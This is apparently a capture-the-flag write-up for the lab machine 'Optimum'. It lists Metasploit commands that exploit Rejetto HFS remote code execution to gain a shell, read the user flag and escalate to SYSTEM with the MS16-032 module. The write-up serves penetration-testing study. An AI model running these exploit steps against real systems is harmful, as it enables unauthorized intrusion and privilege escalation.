# Optimum
## Exploiting Rejetto Remote Code Execution
> Gaining a shell has never been easier!

Open msfconsole, do some typing, ???, profit. You just pwned the system.
```
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.10.10.8
set SRVHOST 10.10.14.13
run
```
*Poof, a shell appeared*
You can find yourself the user flag in the Desktop directory.
```
cd C:\Users\kostas\Desktop
type user.txt.txt
```
*Congratulations You Got The User Flag!*
Let's move onto getting the root flag.

```
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```
*2 Possible Vulnerabilities*
```
[*] 10.10.10.8 - Collecting local exploits for x86/windows...
[*] 10.10.10.8 - 29 exploit checks are being tried...
[+] 10.10.10.8 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
[*] Post module execution completed
```
> Bypass won't work because we are not in the admins group. You can use the logon_handle.

```
use windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 1
run
```
*Bow, You should be Golden*
